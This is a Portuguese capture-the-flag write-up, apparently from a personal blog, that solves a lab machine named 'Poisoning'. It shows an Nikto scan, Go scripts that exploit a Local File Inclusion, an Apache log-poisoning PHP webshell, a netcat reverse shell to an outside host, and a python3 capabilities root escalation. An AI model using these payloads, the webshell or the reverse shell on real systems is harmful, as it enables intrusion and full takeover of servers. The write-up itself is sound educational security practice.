> 本文由 [简悦 SimpRead](http://ksria.com/simpread/) 转码， 原文地址 [march0s1as.github.io](https://march0s1as.github.io/writeups/poisoning.html)

> https://march0s1as.github.io/writeups/

* * *

Eaí, hackers! Bem-vindes a mais um writeup das máquinas da tropa 🥳. Nesta resolução, nós realizaremos a máquina **Poisoning**, onde exploraremos na mesma um **Local File Inclusion** e pegaremos RCE nela através da técnica chamada **Log Poisoning**. Sem mais enrolações, vamos lá!

```
PORT   STATE SERVICE REASON  VERSION
22/tcp open  ssh     syn-ack OpenSSH 7.6p1 Ubuntu
80/tcp open  http    syn-ack Apache httpd 2.4.29 


```

* * *

### Reconhecimento web. 🔍

Quando nós abrimos a página do site em nosso navegador, nos deparamos com a seguinte interface:

![](https://march0s1as.github.io/writeups/Poisoning%200749356350ea47c69e78814c712333a2/Untitled.png)

Eu passei um bom tempo analisando a página, as requisições, o código-fonte, as libs em javascript .. e nada 🤧. Então, eu decidi utilizar um scan que eu usava há muito tempo e que hoje foi essencial: **Nikto**. Rodando ele, o mesmo achou um **Local File Inclusion**!

```
- Nikto v2.1.6
---------------------------------------------------------------------------
+ Target IP:          10.9.2.11
+ Target Hostname:    10.9.2.11
+ Target Port:        80
+ Start Time:         2021-09-19 23:54:55 (GMT-3)
---------------------------------------------------------------------------
+ Server: Apache/2.4.29 (Ubuntu)
+ The anti-clickjacking X-Frame-Options header is not present.
+ The X-XSS-Protection header is not defined. This header can hint to the user agent to protect against some forms of XSS
+ The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site in a different fashion to the MIME type
+ No CGI Directories found (use '-C all' to force check all possible dirs)
+ Web Server returns a valid response with junk HTTP methods, this may cause false positives.
+ /index.php?page=../../../../../../../../../../etc/passwd: The PHP-Nuke Rocket add-in is vulnerable to file traversal, allowing an attacker to view any file on the host. (probably Rocket, but could be any index.php)


```

A falha consiste quando o back-end confirma a variável que irá puxar o path do arquivo como algo não manipulável, mas na verdade é. Com a não validação do back-end para verificar o path do arquivo, o hacker consegue controlar qual arquivo ele deseja ver desde que tenha privilégio para isso.

Partindo para a prática, vamos tentar ler o arquivo **/etc/passwd** com o parâmetro “**?page=/etc/passwd**”. Vamos ver:

![](https://march0s1as.github.io/writeups/Poisoning%200749356350ea47c69e78814c712333a2/Untitled%201.png)

E, conseguimos 🥵! Pra quem já é de costume nos meus writeups, sabem que eu sempre gosto de criar um scriptzinho pra agilizar a bagunça. Aqui está o meu código:

```
package main
import (
	"fmt"
	"strings"
	"net/http"
	"io/ioutil"
)

func Between(str, starting, ending string) string {
    s := strings.Index(str, starting)
    if s < 0 {
        return ""
    }
    s += len(starting)
    e := strings.Index(str[s:], ending)
    if e < 0 {
        return ""
    }
    return str[s : s+e]
}

func lfi(url string){
	req, err := http.Get(url)
	if err != nil{ panic(err) }

	body, err := ioutil.ReadAll(req.Body)
	if err != nil{ panic(err) }
	fmt.Print(Between(string(body),"<b>","</b>"))
}

func main(){
	for {
		var payload string
		fmt.Println(" ")
		fmt.Print("enjoy :/ ")
		fmt.Scan(&payload)
		site := "http://10.9.2.11/index.php?page=" + payload
		lfi(site)
	}
}


```

Com isso, eu preciso apenas especificar o arquivo que eu quero ler e está feito! 😶‍🌫️

![](https://march0s1as.github.io/writeups/Poisoning%200749356350ea47c69e78814c712333a2/Untitled%202.png)

### LFI to RCE com Log Poisoning. 👽

E agora vamos para o tão falado Remote Code Execution! Pesquisando mais sobre a vulnerabilidade, eu pude encontrar uma lista de path de arquivos que podem gerar um Log Poisoning. Para não testar de um por um, eu desenvolvi mais um script que faça isso por mim.

```
package main
import (
	"os"
	"fmt"
	"bufio"
	"strings"
	"net/http"
	"io/ioutil"
)

func Between(str, starting, ending string) string {
    s := strings.Index(str, starting)
    if s < 0 {
        return ""
    }
    s += len(starting)
    e := strings.Index(str[s:], ending)
    if e < 0 {
        return ""
    }
    return str[s : s+e]
}

func lfi(url string){
	req, err := http.Get(url)
	if err != nil{ panic(err) }

	body, err := ioutil.ReadAll(req.Body)
	if err != nil{ panic(err) }
	fmt.Print(Between(string(body),"<b>","</b>"))
}

func main(){

	file, err := os.Open("poisoning.txt") // especificar o path da wordlist
	 
	if err != nil {
		fmt.Println("falha ao ler arquivo, favor verificar o path.")
	}
 
	scanner := bufio.NewScanner(file)
	scanner.Split(bufio.ScanLines)
	var txtlines []string
 
	for scanner.Scan() {
		txtlines = append(txtlines, scanner.Text())
	}
	 
	file.Close()
 
	for _, eachline := range txtlines {
		fmt.Println(eachline)
		site := fmt.Sprintf("http://10.9.2.11/index.php?page=%s", eachline)
		lfi(site)
	}
}


```

Com isso, pegamos o resultado! 👾

![](https://march0s1as.github.io/writeups/Poisoning%200749356350ea47c69e78814c712333a2/Untitled%203.png)

Vemos que o arquivo **/var/log/apache2/access.log** aparece para nós. Ou seja, nós temos acesso para o mesmo. Com isso, vamos realizar a técnica de **Log Poisoning**. Tal técnica consiste em adicionarmos um código de webshell em nosso **User-Agent**, e posteriormente acessarmos o arquivo de logs com o parâmetro especificado na webshell. Com isso, nós conseguiremos utilizar a nossa webshell com efetividade através do envenenamento dos logs. Vamos ver em prática:

![](https://march0s1as.github.io/writeups/Poisoning%200749356350ea47c69e78814c712333a2/Untitled%204.png)

![](https://march0s1as.github.io/writeups/Poisoning%200749356350ea47c69e78814c712333a2/Untitled%205.png)

```
<?php system($_GET['c']); ?>


```

### Reverse shell! 😈

Agora ficou fácil! Vamos pegar a reverse shell. Para isso, eu utilizei uma reverse em netcat e URL Encode. Aqui está ela:

```
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.14.3 1234 >/tmp/f


```

![](https://march0s1as.github.io/writeups/Poisoning%200749356350ea47c69e78814c712333a2/Untitled%206.png)

### Escalação de Privilégios. 📈

Enumerando um pouco a máquina, nos deparamos com um misconfiguration de **capabilities do python 3.6**. Para isso, basta executarmos este comando e pegmaos root:

```
python3 -c 'import os; os.setuid(0); os.system("/bin/sh")'


```

![](https://march0s1as.github.io/writeups/Poisoning%200749356350ea47c69e78814c712333a2/Untitled%207.png)

[Meus writeups.](https://www.notion.so/Meus-writeups-d30b3cfa2b3b4eaa93eff0967ffa17ce)